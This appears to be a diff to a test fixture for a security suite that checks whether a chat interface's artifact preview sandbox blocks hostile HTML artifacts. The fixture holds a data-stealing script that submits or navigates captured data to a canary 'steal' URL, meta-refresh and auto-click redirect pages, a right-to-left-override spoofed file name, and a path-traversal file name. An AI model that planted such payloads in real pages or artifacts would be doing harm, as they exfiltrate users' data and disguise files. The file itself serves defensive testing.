@@ -26,8 +26,14 @@
 
 import { ARTIFACT_SEND_PROMPT_MESSAGE } from '../../../shared/artifactPreview.js';
 import { directive } from './compromisedModel.mjs';
+import { CANARY } from './scenario.mjs';
 
-/** The attacker's host as the browser sees it (never resolves; the specs intercept it). */
+/**
+ * The attacker's host as the browser sees it (never resolves; the specs intercept it). The
+ * navigation variants point at the suite's real canary listener instead (`CANARY`): a
+ * navigation is the one channel that goes through, and its server-side log is evidence a
+ * browser-side observer can miss for a frame that was only just created.
+ */
 const BROWSER_CANARY = 'https://canary.invalid';
 
 /** The text a hostile artifact asks the host chat to send; no chat may ever send it unasked. */
@@ -92,7 +98,7 @@ const stealScript = ({ navigate }) => `
     var field = document.createElement('input'); field.name = 'd'; field.value = decodeURIComponent(seen);
     form.appendChild(field); document.body.appendChild(form); form.submit(); return 'submitted';
   });
-  ${navigate ? `location.href = '${BROWSER_CANARY}/steal-navigate?d=' + seen;` : ''}
+  ${navigate ? `location.href = '${CANARY}/steal-navigate?d=' + seen;` : ''}
   Promise.allSettled(pending).then(function () { setTimeout(function () { window.__done = true; }, 500); });
 })();
 `;
@@ -161,14 +167,14 @@ export const HOSTILE_ARTIFACTS = Object.freeze([
   {
     id: 'navigate-meta',
     filename: 'vendor-refresh.html',
-    content: `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=${BROWSER_CANARY}/steal-meta-refresh"><title>Refresh</title></head><body><h1>Refresh</h1></body></html>`,
+    content: `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=${CANARY}/steal-meta-refresh"><title>Refresh</title></head><body><h1>Refresh</h1></body></html>`,
     stealing: false,
     navigates: true
   },
   {
     id: 'navigate-link',
     filename: 'vendor-link.html',
-    content: `<!doctype html><html><body><a id="go" href="${BROWSER_CANARY}/steal-link-click">Continue</a><script>document.getElementById('go').click()</script></body></html>`,
+    content: `<!doctype html><html><body><a id="go" href="${CANARY}/steal-link-click">Continue</a><script>document.getElementById('go').click()</script></body></html>`,
     stealing: false,
     navigates: true
   },
@@ -191,7 +197,7 @@ export const HOSTILE_ARTIFACTS = Object.freeze([
     content: plainHtml,
     stealing: false
   },
-  { id: 'name-rtl', filename: '‮gpj.html', content: plainHtml, stealing: false },
+  { id: 'name-rtl', filename: '\u202Egpj.html', content: plainHtml, stealing: false },
   {
     id: 'name-traversal',
     filename: '../../../etc/passwd.html',
